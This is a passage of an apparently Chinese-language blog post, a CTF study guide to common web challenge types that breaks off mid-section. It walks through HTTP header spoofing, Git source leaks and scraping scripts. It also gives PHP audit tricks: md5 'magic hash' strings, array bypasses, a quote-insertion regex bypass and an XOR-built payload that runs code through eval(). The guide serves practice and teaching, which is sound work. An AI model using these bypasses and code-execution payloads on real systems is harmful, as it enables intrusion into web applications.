@@ -1,0 +1,1205 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Matianxin">
+  <meta name="keywords" content="CTF">
+  
+    <meta name="description" content="CTF中Web题目的常见题型及解题技巧">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF中Web题目的常见题型及解题技巧">
+<meta property="og:url" content="http://maitianxin.github.io/2020/05/19/other/ctf_web/index.html">
+<meta property="og:site_name" content="圣特伦特星">
+<meta property="og:description" content="CTF中Web题目的常见题型及解题技巧">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-05-19T03:00:00.000Z">
+<meta property="article:modified_time" content="2024-02-26T06:21:57.101Z">
+<meta property="article:author" content="Matianxin">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>CTF中Web题目的常见题型及解题技巧 - 圣特伦特星</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"maitianxin.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>圣特伦特星</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CTF中Web题目的常见题型及解题技巧"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2020-05-19 11:00" pubdate>
+          2020年5月19日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          33 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CTF中Web题目的常见题型及解题技巧</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="基础知识类题目"><a href="#基础知识类题目" class="headerlink" title="基础知识类题目"></a>基础知识类题目</h2><p>考察基本的查看网页源代码、HTTP请求、修改页面元素等。<br>这些题很简单，比较难的比赛应该不会单独出，就算有应该也是Web的签到题。<br>实际做题的时候基本都是和其他更复杂的知识结合起来出现。</p>
+<h3 id="查看网页源代码"><a href="#查看网页源代码" class="headerlink" title="查看网页源代码"></a>查看网页源代码</h3><p>按F12就都看到了，flag一般都在注释里，有时候注释里也会有一条hint或者是对解题有用的信息。</p>
+<ul>
+<li>Bugku web2: <a target="_blank" rel="noopener" href="http://123.206.87.240:8002/web2/">http://123.206.87.240:8002/web2/</a></li>
+<li>Bugku web3: <a target="_blank" rel="noopener" href="http://123.206.87.240:8002/web3/">http://123.206.87.240:8002/web3/</a></li>
+</ul>
+<h3 id="发送HTTP请求"><a href="#发送HTTP请求" class="headerlink" title="发送HTTP请求"></a>发送HTTP请求</h3><p>可以用hackbar，有的也可以写脚本。</p>
+<ul>
+<li>Bugku web基础$_GET: <a target="_blank" rel="noopener" href="http://123.206.87.240:8002/get/">http://123.206.87.240:8002/get/</a></li>
+<li>Bugku web基础$_POST: <a target="_blank" rel="noopener" href="http://123.206.87.240:8002/post/">http://123.206.87.240:8002/post/</a></li>
+<li>Bugku 点击一百万次: <a target="_blank" rel="noopener" href="http://123.206.87.240:9001/test/">http://123.206.87.240:9001/test/</a></li>
+</ul>
+<p>举个写脚本的例子，（题目是Bugku web基础$POST）：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import requests<br>r = requests<span class="hljs-selector-class">.post</span>(<span class="hljs-string">&#x27;http://123.206.87.240:8002/post/&#x27;</span>, data=&#123;<span class="hljs-string">&#x27;what&#x27;</span> : <span class="hljs-string">&#x27;flag&#x27;</span>&#125;)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(r.text)</span></span><br></code></pre></td></tr></table></figure>
+
+<h3 id="不常见类型的请求发送"><a href="#不常见类型的请求发送" class="headerlink" title="不常见类型的请求发送"></a>不常见类型的请求发送</h3><p>考OPTIONS请求，如果要发送这类请求，写一个脚本应该就能解决了。</p>
+<h3 id="HTTP头相关的题目"><a href="#HTTP头相关的题目" class="headerlink" title="HTTP头相关的题目"></a>HTTP头相关的题目</h3><p>主要是查看和修改HTTP头。<br>目前做过的Web题目有很大一部分都是与HTTP头相关的，而且这种题目也相当常见，不和其他知识结合的情况下也算是属于基础题的范畴吧。<br>技巧：不同的类型有不同的利用方法，基本都离不开抓包改包，有些简单的也可以利用浏览器F12的网络标签解决。 但是最根本的应对策略，是熟悉一些常见请求头的格式、作用等，这样题目考到的时候就很容易知道要怎样做了。</p>
+<h3 id="查看响应头"><a href="#查看响应头" class="headerlink" title="查看响应头"></a>查看响应头</h3><p>有时候响应头里会有hint或者题目的关键信息，也有的时候会直接把flag放在响应头里给你，但是直接查看响应头拿flag的题目并不多，因为太简单了。<br>只是查看的话，可以不用抓包，用F12的“网络”标签就可以解决了。<br>Bugku 头等舱: <a target="_blank" rel="noopener" href="http://123.206.87.240:9009/hd.php">http://123.206.87.240:9009/hd.php</a></p>
+<h3 id="修改请求头、伪造Cookie"><a href="#修改请求头、伪造Cookie" class="headerlink" title="修改请求头、伪造Cookie"></a>修改请求头、伪造Cookie</h3><p>常见的有set-cookie、XFF和Referer，总之考法很灵活，做法比较固定，知道一些常见的请求头再根据题目随机应变就没问题了。<br>有些题目还需要伪造Cookie，根据题目要求做就行了。<br>可以用BurpSuite抓包，也可以直接在浏览器的F12“网络”标签里改。</p>
+<ul>
+<li>实验吧 头有点大： <a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/sHeader/">http://ctf5.shiyanbar.com/sHeader/</a></li>
+<li>Bugku 程序员本地网站： <a target="_blank" rel="noopener" href="http://123.206.87.240:8002/localhost/">http://123.206.87.240:8002/localhost/</a></li>
+<li>Bugku 管理员系统： <a target="_blank" rel="noopener" href="http://123.206.31.85:1003/">http://123.206.31.85:1003/</a></li>
+<li>XCTF xff_referer： <a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5068">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=0&amp;id=5068</a></li>
+</ul>
+<h3 id="Git源码泄露"><a href="#Git源码泄露" class="headerlink" title="Git源码泄露"></a>Git源码泄露</h3><p>flag一般在源码的某个文件里，但也有和其他知识结合、需要进一步利用的情况，比如XCTF社区的mfw这道题。<br>技巧：GitHack一把梭<br>XCTF mfw: <a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5002">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5002</a></p>
+<h3 id="Python爬虫信息处理"><a href="#Python爬虫信息处理" class="headerlink" title="Python爬虫信息处理"></a>Python爬虫信息处理</h3><p>这类题目一般都是给一个页面，页面中有算式或者是一些数字，要求在很短的时间内求出结果并提交，如果结果正确就可以返回flag。</p>
+<p>因为所给时间一般都很短而且计算比较复杂，所以只能写脚本。这种题目的脚本一般都需要用到requests库和BeautifulSoup库（或者re库（正则表达式）），个人感觉使用BeautifulSoup简单一些。</p>
+<p>技巧：requests库和BeautifulSoup库熟练掌握后，再多做几道题或者写几个爬虫的项目，一般这类题目就没有什么问题了。主要还是对BeautifulSoup的熟练掌握，另外还需要一点点web前端（HTML）的知识。</p>
+<ul>
+<li>Bugku 秋名山老司机： <a target="_blank" rel="noopener" href="http://123.206.87.240:8002/qiumingshan/">http://123.206.87.240:8002/qiumingshan/</a></li>
+</ul>
+<p>#这道题的脚本如下，还可以继续优化<br>#经常出现执行了但是不弹flag的情况，多试几次就行了</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from bs4 import BeautifulSoup<br>import requests<br><br>r = requests<span class="hljs-selector-class">.Session</span>()<br>s = r<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&quot;http://123.206.87.240:8002/qiumingshan/&quot;</span>)<br>s<span class="hljs-selector-class">.encoding</span> = <span class="hljs-string">&#x27;utf-8&#x27;</span><br>text = s<span class="hljs-selector-class">.text</span><br>soup = <span class="hljs-built_in">BeautifulSoup</span>(text)<br>tag = soup<span class="hljs-selector-class">.div</span><br>express = <span class="hljs-built_in">str</span>(tag.string)<br>express = express<span class="hljs-selector-attr">[0 : -3]</span><br>answer = <span class="hljs-built_in">eval</span>(express)<br>ans = &#123;<span class="hljs-string">&quot;value&quot;</span> : answer&#125;<br>flag = r<span class="hljs-selector-class">.post</span>(<span class="hljs-string">&#x27;http://123.206.87.240:8002/qiumingshan/&#x27;</span>, data = ans)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(flag.text)</span></span><br></code></pre></td></tr></table></figure>
+<ul>
+<li>实验吧 速度爆破： <a target="_blank" rel="noopener" href="http://www.shiyanbar.com/ctf/1841">http://www.shiyanbar.com/ctf/1841</a><br>HGAME2019的部分题目似乎还出现了反爬虫措施。</li>
+</ul>
+<h3 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h3><p>代码审计覆盖面特别广，分类也很多，而且几乎什么样的比赛都会有，算是比较重要的题目类型之一吧。<br>技巧：具体问题具体分析，归根结底还是要熟练掌握PHP这门语言，了解一些常见的会造成漏洞的函数及利用方法等。</p>
+<h2 id="hash加密相关"><a href="#hash加密相关" class="headerlink" title="hash加密相关"></a>hash加密相关</h2><h3 id="PHP弱类型hash比较缺陷"><a href="#PHP弱类型hash比较缺陷" class="headerlink" title="PHP弱类型hash比较缺陷"></a>PHP弱类型hash比较缺陷</h3><p>这是代码审计最基础的题目了，也比较常见。<br>典型代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;    <span class="hljs-comment">//注意两个等号“==”</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>加密函数也有可能是sha1或者其他的，但是原理都是不变的。<br>这个漏洞的原理如下：<br>&#x3D;&#x3D; 在进行比较的时候，会先将两边的变量类型转化成相同的，再进行比较。<br>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。<br>所以只要让b在经过相应的函数加密之后都是以0e开头就可以。</p>
+<p>以下是一些md5加密后开头为0e的字符串：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs dns">QNKCDZO<br><span class="hljs-number">0</span>e830400451993494058<span class="hljs-number">024219903391</span><br><br>s878926199a<br><span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span><br><br>s155964671a<br><span class="hljs-number">0</span>e342768416822451524<span class="hljs-number">974117254469</span><br><br>s214587387a<br><span class="hljs-number">0</span>e8482404488305379244<span class="hljs-number">65865611904</span><br><br>s214587387a<br><span class="hljs-number">0</span>e8482404488305379244<span class="hljs-number">65865611904</span><br><br>s878926199a<br><span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span><br><br>s1091221200a<br><span class="hljs-number">0</span>e9406242178565615578<span class="hljs-number">16327384675</span><br><br>s1885207154a<br><span class="hljs-number">0</span>e5093672134182067008<span class="hljs-number">42008763514</span><br><br>aabg7XSs<br></code></pre></td></tr></table></figure>
+<p>另外，这个也可以用数组绕过，这个方法在下面会详细说。</p>
+<h3 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h3><p>PHP绝大多数函数无法处理数组，向md5函数传入数组类型的参数会使md5()函数返回NULL（转换后为False），进而绕过某些限制。<br>如果上面的代码变成：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;       <span class="hljs-comment">//两个等号变成三个</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>那么利用弱类型hash比较缺陷将无法绕过，这时可以使用数组绕过。</p>
+<p>传入?a[]&#x3D;1&amp;b[]&#x3D;2就可以成功绕过判断。</p>
+<p>这样的方法也可以用来绕过sha1()等hash加密函数相关的判断，也可以绕过正则判断，可以根据具体情况来灵活运用。</p>
+<h2 id="正则表达式相关"><a href="#正则表达式相关" class="headerlink" title="正则表达式相关"></a>正则表达式相关</h2><h3 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h3><p>ereg函数存在NULL截断漏洞，使用NULL可以截断过滤，所以可以使用%00截断正则匹配。</p>
+<ul>
+<li>Bugku ereg正则%00截断：<a target="_blank" rel="noopener" href="http://123.206.87.240:9009/5.php">http://123.206.87.240:9009/5.php</a></li>
+</ul>
+<h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>正则表达式相关的函数也可以使用数组绕过过滤，绕过方法详见数组返回NULL绕过。</p>
+<p>上面那道题也可以用数组绕过。</p>
+<h3 id="单引号绕过preg-match-正则匹配"><a href="#单引号绕过preg-match-正则匹配" class="headerlink" title="单引号绕过preg_match()正则匹配"></a>单引号绕过preg_match()正则匹配</h3><p>在每一个字符前加上单引号可以绕过preg_match的匹配，原理暂时不明。</p>
+<p>例如有如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9a-zA-Z]&#123;2&#125;/&#x27;</span>,<span class="hljs-variable">$p</span>) === <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;False&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$pp</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$p</span>));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pp</span> === <span class="hljs-string">&#x27;flag.php&#x27;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;success&#x27;</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">payload：p=<span class="hljs-string">&#x27;Z&#x27;</span>m<span class="hljs-string">&#x27;x&#x27;</span><span class="hljs-built_in">h</span><span class="hljs-string">&#x27;Z&#x27;</span>y<span class="hljs-string">&#x27;5&#x27;</span>w<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-built_in">H</span><span class="hljs-string">&#x27;A&#x27;</span>=<br></code></pre></td></tr></table></figure>
+
+<h3 id="不含数字与字母的WebShell"><a href="#不含数字与字母的WebShell" class="headerlink" title="不含数字与字母的WebShell"></a>不含数字与字母的WebShell</h3><p>如果题目使用preg_match()过滤掉了所有的数字和字母，但是没有过滤PHP的变量符号$，可以考虑使用这种方法。</p>
+<p>典型代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span><span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">50</span>)&#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Too Long.&quot;</span>);<br>  &#125;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9_]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not Allowed.&quot;</span>);<br>  &#125;<br>   @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>   <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">//$hint = &quot;php function getFlag() to get flag&quot;;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这种方法的核心是字符串的异或操作。</p>
+<p>爆破脚本：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">chr1 = <span class="hljs-selector-attr">[<span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;!&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-string">&#x27;~&#x27;</span>]</span><br>chr2 = <span class="hljs-selector-attr">[<span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;!&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-string">&#x27;~&#x27;</span>]</span><br><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> chr1 :<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> chr2 :<br>        <span class="hljs-built_in">print</span>(<span class="hljs-selector-tag">i</span> + <span class="hljs-string">&#x27;xor&#x27;</span> + j + <span class="hljs-string">&#x27;=&#x27;</span> + (<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i) ^ <span class="hljs-built_in">ord</span>(j))))<br></code></pre></td></tr></table></figure>
+
+<p>根据题目的要求，用异或出来的字符串拼出合适的Payload，并放在PHP变量中执行。变量名可以用中文。</p>
+<p>比如这道题的</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">Payload</span>：<span class="hljs-string">?c</span>ode=<span class="hljs-variable">$啊</span>=<span class="hljs-string">&quot;@@^|@@@&quot;</span>^<span class="hljs-string">&quot;&#x27;%*:,!&#x27;&quot;</span>;<span class="hljs-variable">$啊</span>();<br></code></pre></td></tr></table></figure>
+
+<h3 id="Linux通配符绕过正则匹配"><a href="#Linux通配符绕过正则匹配" class="headerlink" title="Linux通配符绕过正则匹配"></a>Linux通配符绕过正则匹配</h3><p>典型代码如下，与前一种题目非常相似，但也不大一样：</p>
